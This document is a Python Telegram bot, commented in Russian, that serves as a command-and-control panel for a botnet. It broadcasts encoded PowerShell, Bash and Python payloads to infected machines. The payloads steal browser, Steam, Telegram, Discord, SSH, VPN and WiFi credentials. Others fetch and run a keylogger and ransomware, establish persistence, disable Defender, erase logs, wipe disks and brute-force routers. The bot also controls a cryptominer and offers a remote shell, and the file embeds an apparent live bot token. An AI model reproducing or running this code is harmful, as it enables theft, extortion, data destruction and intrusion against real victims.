#!/usr/bin/env python3
# bot.py — для BotHost (bot-hosting.ru)
# Загрузите этот файл в корень проекта бота.

import telebot, json, time, base64, os, re, random, string, subprocess

TOKEN = os.environ.get("BOT_TOKEN", "8800452125:AAETWvKIeP6BgDKWaSAmAhGm6WAq8TCm7pc")  # или вставьте токен напрямую
ADMIN_ID = 6099860667  # ваш числовой Telegram ID

bot = telebot.TeleBot(TOKEN)
bot.parse_mode = None  # отключаем любую разметку

agents = {}
selected = {}
pending = {}

def is_admin(uid): return uid == ADMIN_ID

def auto_target(aid):
    if len(agents) == 1:
        cid = list(agents.keys())[0]
        selected[aid] = cid
        return cid
    return selected.get(aid)

def send_exec(cid, cmd):
    packet = {"cmd": cmd, "ts": int(time.time())}
    payload = base64.b64encode(json.dumps(packet).encode()).decode()
    try:
        bot.send_message(cid, f"EXEC:{payload}")
        return True
    except: return False

def broadcast(cmd):
    for cid in list(agents.keys()):
        send_exec(cid, cmd)

def confirm_kb(aid, cmd_name, target, body):
    token = ''.join(random.choices(string.ascii_letters+string.digits, k=12))
    pending[aid] = {"cmd": cmd_name, "target": target, "body": body, "token": token, "expires": time.time()+120}
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("ПОДТВЕРЖДАЮ", callback_data=f"c_{token}"),
        telebot.types.InlineKeyboardButton("ОТМЕНА", callback_data=f"x_{token}")
    )
    return kb

@bot.message_handler(commands=['start', 'help'])
def help_cmd(msg):
    if not is_admin(msg.from_user.id):
        bot.reply_to(msg, f"Ваш ID: {msg.from_user.id}. Нет доступа.")
        return
    bot.reply_to(msg, (
        "Команды:\n"
        "/clients - список агентов\n"
        "/select id - выбрать цель\n"
        "/runkit id all module - запустить модуль\n"
        "/autorun id all url - загрузить EXE\n"
        "/scan_network - сканировать сеть\n"
        "/infect_routers - заразить роутеры\n"
        "/miner_power id all 0-100 - мощность майнера\n"
        "/miner_stop id all - остановить майнер\n"
        "/ransomware - шифровальщик\n"
        "/kill - удалить агента\n"
        "/wipe - стереть всё\n"
        "/cover_tracks - замести следы\n"
        "/screenshot - скриншот\n"
        "/shell команда - выполнить команду"
    ))

@bot.message_handler(commands=['clients'])
def clients_cmd(msg):
    if not is_admin(msg.from_user.id): return
    if not agents:
        bot.reply_to(msg, "Нет агентов")
        return
    text = "Агенты:\n\n"
    for cid, info in agents.items():
        sel = " (выбран)" if selected.get(msg.from_user.id) == cid else ""
        text += f"{cid} | {info['hostname']} | {info['os']} | Мощность: {info.get('intensity','?')}%{sel}\n"
    bot.reply_to(msg, text)

@bot.message_handler(commands=['select'])
def select_cmd(msg):
    if not is_admin(msg.from_user.id): return
    parts = msg.text.split()
    if len(parts) < 2:
        bot.reply_to(msg, "/select id")
        return
    try:
        cid = int(parts[1])
        if cid in agents:
            selected[msg.from_user.id] = cid
            bot.reply_to(msg, f"Цель: {agents[cid]['hostname']}")
        else: bot.reply_to(msg, "Агент не найден")
    except: bot.reply_to(msg, "Некорректный ID")

STEAL_MODULES = {
    "steal_steam": r'POWERSHELL: $steam=@("$env:PROGRAMFILES\Steam","$env:PROGRAMFILES(X86)\Steam","C:\Steam")|?{Test-Path $_}|select -First 1; if($steam){$d="$env:TEMP\steam";New-Item -ItemType Directory $d -Force|Out-Null; Copy-Item "$steam\config\loginusers.vdf","$steam\config\config.vdf","$steam\ssfn*","$steam\userdata" $d -Recurse -Force; Compress-Archive $d "$env:TEMP\steam.zip" -Force; Remove-Item $d -Recurse -Force}',
    "steal_telegram": r'POWERSHELL: $tg="$env:APPDATA\Telegram Desktop\tdata"; if(Test-Path $tg){taskkill /f /im telegram.exe 2>$null; Sleep 2; Compress-Archive $tg "$env:TEMP\tg_session.zip" -Force}',
    "steal_discord": r'POWERSHELL: $d=@("$env:APPDATA\discord","$env:APPDATA\discordptb","$env:APPDATA\discordcanary"); $tokens=@(); $d|?{Test-Path "$_\Local Storage\leveldb"}|%{Get-ChildItem "$_\Local Storage\leveldb\*.ldb" -Recurse|%{$c=Get-Content $_.FullName -Raw;[regex]::Matches($c,"[\w-]{24}\.[\w-]{6}\.[\w-]{25,40}")|%{$tokens+=$_.Value}}}; $tokens|Out-File "$env:TEMP\discord_tokens.txt"',
    "steal_browsers": r'POWERSHELL: $b=@{"Chrome"="$env:LOCALAPPDATA\Google\Chrome\User Data";"Edge"="$env:LOCALAPPDATA\Microsoft\Edge\User Data";"Brave"="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data";"Opera"="$env:APPDATA\Opera Software\Opera Stable";"Yandex"="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"};$d="$env:TEMP\browsers";New-Item -ItemType Directory $d -Force|Out-Null;foreach($k in $b.Keys){if(Test-Path $b[$k]){$p="$d\$k";New-Item -ItemType Directory $p -Force|Out-Null;@("Default\Login Data","Default\Cookies","Default\History","Default\Web Data","Local State")|%{$s=Join-Path $b[$k] $_;if(Test-Path $s){Copy-Item $s (Join-Path $p (Split-Path $_ -Leaf)) -Force}}}};Compress-Archive $d "$env:TEMP\browser_data.zip" -Force;Remove-Item $d -Recurse -Force',
    "steal_wifi": r'POWERSHELL: netsh wlan export profile key=clear; Get-ChildItem *.xml|Get-Content|Select-String keyMaterial|Out-File "$env:TEMP\wifi.txt"; Remove-Item *.xml',
    "steal_outlook": r'POWERSHELL: $o="$env:LOCALAPPDATA\Microsoft\Outlook"; if(Test-Path $o){Compress-Archive $o "$env:TEMP\outlook.zip" -Force}',
    "steal_vpn": r'POWERSHELL: $v=@("$env:PROGRAMFILES\OpenVPN\config","$env:PROGRAMFILES\WireGuard\Data");$d="$env:TEMP\vpn";New-Item -ItemType Directory $d -Force|Out-Null;$v|?{Test-Path $_}|%{Copy-Item $_ $d -Recurse -Force};Compress-Archive $d "$env:TEMP\vpn.zip" -Force;Remove-Item $d -Recurse -Force',
    "steal_ssh": r'POWERSHELL: $ssh="$env:USERPROFILE\.ssh"; if(Test-Path $ssh){Compress-Archive $ssh "$env:TEMP\ssh_keys.zip" -Force}',
    "steal_ftp": r'POWERSHELL: $f=@("$env:APPDATA\FileZilla\sitemanager.xml","$env:APPDATA\WinSCP\WinSCP.ini","$env:APPDATA\GHISLER\wcx_ftp.ini");$d="$env:TEMP\ftp";New-Item -ItemType Directory $d -Force|Out-Null;$f|?{Test-Path $_}|%{Copy-Item $_ $d -Force};Compress-Archive $d "$env:TEMP\ftp.zip" -Force;Remove-Item $d -Recurse -Force',
    "keylogger": r'POWERSHELL: $wc=New-Object Net.WebClient; $wc.DownloadFile("https://raw.githubusercontent.com/GiacomoLaw/Keylogger/master/windows/keylogger.pyw","$env:TEMP\kl.pyw"); Start-Process pythonw -Args "$env:TEMP\kl.pyw" -WindowStyle Hidden',
    "screenshot": r'POWERSHELL: Add-Type -AssemblyName System.Windows.Forms; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $img=New-Object Drawing.Bitmap $b.Width,$b.Height; $g=[Drawing.Graphics]::FromImage($img); $g.CopyFromScreen(0,0,0,0,$b.Size); $img.Save("$env:TEMP\scr.png")',
    "webcam": r'POWERSHELL: $cam=New-Object -ComObject WScript.Shell; $cam.Run("cmd /c start microsoft.windows.camera:",0)',
    "persist": r'POWERSHELL: New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdate" -Value "C:\Windows\System32\wbem\wmiprvse.exe" -Force; schtasks /create /tn "WinUpdateCore" /tr "C:\Windows\System32\wbem\wmiprvse.exe" /sc onlogon /ru SYSTEM /f 2>$null; reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe,C:\Windows\System32\wbem\wmiprvse.exe" /f',
    "defender_off": r'POWERSHELL: Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true; Add-MpPreference -ExclusionPath "C:\Windows\System32\wbem","C:\Windows\SysWOW64","C:\Windows\Help" -Force',
    "log_clear": r'POWERSHELL: wevtutil el|%{wevtutil cl $_ 2>$null}; Remove-Item C:\Windows\Prefetch\* -Force 2>$null; Remove-Item "$env:TEMP\*" -Recurse -Force 2>$null; [System.Windows.Forms.Clipboard]::Clear()',
    "cover_tracks": r'POWERSHELL: wevtutil el|%{wevtutil cl $_ 2>$null}; Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force; Remove-Item C:\Windows\Prefetch\* -Force; Remove-Item "$env:TEMP\*","$env:LOCALAPPDATA\Temp\*" -Recurse -Force; Clear-RecycleBin -Force; BASH: history -c; rm -rf ~/.bash_history /tmp/* /var/tmp/*; journalctl --rotate; journalctl --vacuum-time=1s',
    "kill_linux": r'BASH: echo c>/proc/sysrq-trigger; kill -11 1; rm -rf /lib/systemd/system/*; dd if=/dev/zero of=/sbin/init bs=512 count=1',
    "kill_windows": r'POWERSHELL: Get-Process csrss,winlogon,lsass|Stop-Process -Force; bcdedit /delete {current} /f',
}

@bot.message_handler(commands=['runkit'])
def runkit_cmd(msg):
    if not is_admin(msg.from_user.id): return
    parts = msg.text.split()
    if len(parts) < 3:
        bot.reply_to(msg, "Формат: /runkit id all module\nДоступные: " + ", ".join(STEAL_MODULES.keys()))
        return
    target_spec = parts[1].lower()
    mod = parts[2].lower()
    if mod not in STEAL_MODULES:
        bot.reply_to(msg, "Неизвестный модуль")
        return
    cmd = STEAL_MODULES[mod]
    if target_spec == "all":
        broadcast(cmd)
        bot.reply_to(msg, f"Модуль {mod} запущен на всех")
    else:
        try:
            cid = int(target_spec)
            if cid in agents:
                send_exec(cid, cmd)
                bot.reply_to(msg, f"Модуль {mod} запущен на {agents[cid]['hostname']}")
            else: bot.reply_to(msg, "Агент не найден")
        except: bot.reply_to(msg, "Некорректный ID")

@bot.message_handler(commands=['autorun'])
def autorun_cmd(msg):
    if not is_admin(msg.from_user.id): return
    parts = msg.text.split()
    if len(parts) < 3:
        bot.reply_to(msg, "Формат: /autorun id all url")
        return
    target_spec = parts[1].lower()
    url = parts[2]
    cmd = f'POWERSHELL: $n=[IO.Path]::GetFileNameWithoutExtension("{url}")+".exe"; $d="C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\$n"; (New-Object Net.WebClient).DownloadFile("{url}",$d); attrib +s +h $d; New-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name $n -Value $d -Force; Start-Process $d -WindowStyle Hidden'
    if target_spec == "all":
        broadcast(cmd)
        bot.reply_to(msg, f"Загрузка на всех: {url}")
    else:
        try:
            cid = int(target_spec)
            if cid in agents:
                send_exec(cid, cmd)
                bot.reply_to(msg, f"Загрузка на {agents[cid]['hostname']}")
            else: bot.reply_to(msg, "Агент не найден")
        except: bot.reply_to(msg, "Некорректный ID")

@bot.message_handler(commands=['scan_network'])
def scan_network_cmd(msg):
    if not is_admin(msg.from_user.id): return
    t = auto_target(msg.from_user.id)
    if not t: bot.reply_to(msg, "Нет целей"); return
    cmd = r'PYTHON: import subprocess,json,re,socket,base64; out=subprocess.check_output("arp -a",shell=True).decode(); res={"devices":[]}; [res["devices"].append({"ip":m.group(1),"mac":m.group(2)}) for m in re.finditer(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:-]+)",out)]; print("NETMAP:"+base64.b64encode(json.dumps(res).encode()).decode())'
    send_exec(t, cmd)
    bot.reply_to(msg, f"Сканирование сети на {agents[t]['hostname']}")

@bot.message_handler(commands=['infect_routers'])
def infect_routers_cmd(msg):
    if not is_admin(msg.from_user.id): return
    t = auto_target(msg.from_user.id)
    if not t: bot.reply_to(msg, "Нет целей"); return
    creds = str([("root","admin"),("admin","admin"),("admin","password")])
    cmd = f'PYTHON: import paramiko,socket,json,base64; creds={creds}; results={{"infected":[]}}; [results["infected"].append({{"ip":ip,"user":u,"pass":p}}) for ip in [f"192.168.1.\\{{i}}" for i in range(1,254)] for u,p in creds if (lambda s: (s.connect_ex((ip,22))==0 and (s.close() or True)))(socket.socket()) and (lambda ssh: (ssh.connect(ip,22,u,p,timeout=5,banner_timeout=5) or True) and (ssh.exec_command("echo backdoor") or True) and ssh.close())(paramiko.SSHClient())]; print("ROUTER_INFECT:"+base64.b64encode(json.dumps(results).encode()).decode())'
    kb = confirm_kb(msg.from_user.id, "infect_routers", t, cmd)
    bot.reply_to(msg, f"Заразить роутеры на {agents[t]['hostname']}?", reply_markup=kb)

@bot.message_handler(commands=['miner_power'])
def miner_power_cmd(msg):
    if not is_admin(msg.from_user.id): return
    parts = msg.text.split()
    if len(parts) < 3:
        bot.reply_to(msg, "Формат: /miner_power id all 0-100")
        return
    target_spec = parts[1].lower()
    try:
        intensity = int(parts[2])
        if not 0 <= intensity <= 100: raise ValueError
    except: bot.reply_to(msg, "Процент от 0 до 100"); return
    cmd = f"MINER_INTENSITY:{intensity}"
    if target_spec == "all":
        for cid in agents:
            if send_exec(cid, cmd): agents[cid]['intensity'] = intensity
        bot.reply_to(msg, f"Мощность {intensity}% для всех")
    else:
        try:
            cid = int(target_spec)
            if cid in agents:
                if send_exec(cid, cmd):
                    agents[cid]['intensity'] = intensity
                    bot.reply_to(msg, f"Мощность {intensity}% для {agents[cid]['hostname']}")
                else: bot.reply_to(msg, "Ошибка отправки")
            else: bot.reply_to(msg, "Агент не найден")
        except: bot.reply_to(msg, "Некорректный ID")

@bot.message_handler(commands=['miner_stop'])
def miner_stop_cmd(msg):
    if not is_admin(msg.from_user.id): return
    parts = msg.text.split()
    if len(parts) < 2:
        bot.reply_to(msg, "Формат: /miner_stop id all")
        return
    target_spec = parts[1].lower()
    cmd = "MINER_INTENSITY:0"
    if target_spec == "all":
        for cid in agents:
            send_exec(cid, cmd); agents[cid]['intensity'] = 0
        bot.reply_to(msg, "Майнер остановлен на всех")
    else:
        try:
            cid = int(target_spec)
            if cid in agents:
                send_exec(cid, cmd); agents[cid]['intensity'] = 0
                bot.reply_to(msg, f"Майнер остановлен на {agents[cid]['hostname']}")
            else: bot.reply_to(msg, "Агент не найден")
        except: bot.reply_to(msg, "Некорректный ID")

@bot.message_handler(commands=['ransomware'])
def ransomware_cmd(msg):
    if not is_admin(msg.from_user.id): return
    t = auto_target(msg.from_user.id)
    if not t: bot.reply_to(msg, "Нет целей"); return
    cmd = 'POWERSHELL: $wc=New-Object Net.WebClient; $wc.DownloadFile("https://github.com/goliate/hidden-tear/raw/master/hidden-tear.exe","C:\\Windows\\Help\\Windows\\en-US\\ransom.exe"); Start-Process "C:\\Windows\\Help\\Windows\\en-US\\ransom.exe" -WindowStyle Hidden; vssadmin delete shadows /all /quiet; bcdedit /set {default} recoveryenabled No'
    kb = confirm_kb(msg.from_user.id, "ransomware", t, cmd)
    bot.reply_to(msg, f"Шифровальщик на {agents[t]['hostname']}?", reply_markup=kb)

@bot.message_handler(commands=['kill'])
def kill_cmd(msg):
    if not is_admin(msg.from_user.id): return
    t = auto_target(msg.from_user.id)
    if not t: bot.reply_to(msg, "Нет целей"); return
    cmd = 'POWERSHELL: Remove-Item C:\\Windows\\System32\\wbem\\wmiprvse.exe,C:\\Windows\\SysWOW64\\msiexec.exe,C:\\Windows\\Help\\Windows\\en-US\\help.exe -Force; reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /f; schtasks /delete /tn "WinUpdateCore" /f; BASH: rm -rf /usr/lib/systemd/systemd-networkd /usr/lib/apt/apt-helper; crontab -r; systemctl --user disable dbus 2>/dev/null'
    kb = confirm_kb(msg.from_user.id, "kill", t, cmd)
    bot.reply_to(msg, f"Удалить агента с {agents[t]['hostname']}?", reply_markup=kb)

@bot.message_handler(commands=['wipe'])
def wipe_cmd(msg):
    if not is_admin(msg.from_user.id): return
    t = auto_target(msg.from_user.id)
    if not t: bot.reply_to(msg, "Нет целей"); return
    cmd = 'POWERSHELL: $d=Get-Disk 0; for($i=0;$i -lt 7;$i++){$d.Clear(0,$d.Size)}; $d|Clear-Disk -RemoveData -RemoveOEM -Confirm:$false; wevtutil el|%{wevtutil cl $_}; bcdedit /delete {current} /f; shutdown /s /f /t 0; BASH: shred -vfz -n 7 /dev/sda; rm -rf /var/log/* /tmp/* ~/.bash_history; echo c>/proc/sysrq-trigger'
    kb = confirm_kb(msg.from_user.id, "wipe", t, cmd)
    bot.reply_to(msg, f"Wipe на {agents[t]['hostname']}?", reply_markup=kb)

@bot.message_handler(commands=['cover_tracks'])
def cover_tracks_cmd(msg):
    if not is_admin(msg.from_user.id): return
    t = auto_target(msg.from_user.id)
    if not t: bot.reply_to(msg, "Нет целей"); return
    send_exec(t, STEAL_MODULES["cover_tracks"])
    bot.reply_to(msg, f"Следы заметены на {agents[t]['hostname']}")

@bot.message_handler(commands=['screenshot'])
def screenshot_cmd(msg):
    if not is_admin(msg.from_user.id): return
    t = auto_target(msg.from_user.id)
    if not t: bot.reply_to(msg, "Нет целей"); return
    send_exec(t, STEAL_MODULES["screenshot"])
    bot.reply_to(msg, f"Скриншот запрошен у {agents[t]['hostname']}")

@bot.message_handler(commands=['shell'])
def shell_cmd(msg):
    if not is_admin(msg.from_user.id): return
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2: bot.reply_to(msg, "/shell команда"); return
    t = auto_target(msg.from_user.id)
    if not t: bot.reply_to(msg, "Нет целей"); return
    cmd = f'POWERSHELL: {parts[1]} || BASH: {parts[1]}'
    send_exec(t, cmd)
    bot.reply_to(msg, f"Выполнено: {parts[1][:50]} на {agents[t]['hostname']}")

@bot.message_handler(func=lambda m: m.text and m.text.startswith("REG:"))
def reg_agent(msg):
    try:
        data = json.loads(base64.b64decode(msg.text[4:]).decode())
        cid = msg.chat.id
        agents[cid] = {"hostname": data.get("hostname","?"), "os": data.get("os","?"), "ip": data.get("ip","?"), "intensity": 0, "status": "Онлайн"}
        if len(agents) == 1: selected[ADMIN_ID] = cid
        bot.send_message(ADMIN_ID, f"Агент подключён: {data.get('hostname')}")
    except Exception as e:
        print(f"REG error: {e}")

@bot.callback_query_handler(func=lambda c: c.data.startswith("c_") or c.data.startswith("x_"))
def confirm_callback(call):
    if not is_admin(call.from_user.id): return
    tok = call.data[2:]
    if call.from_user.id not in pending or pending[call.from_user.id]["token"] != tok:
        bot.answer_callback_query(call.id, "Истекло"); return
    p = pending.pop(call.from_user.id)
    if call.data.startswith("x_"):
        bot.edit_message_text("Отменено", call.message.chat.id, call.message.message_id); return
    send_exec(p["target"], p["body"])
    bot.edit_message_text("Выполнено", call.message.chat.id, call.message.message_id)

if __name__ == '__main__':
    print("Бот запущен")
    bot.polling(none_stop=True)
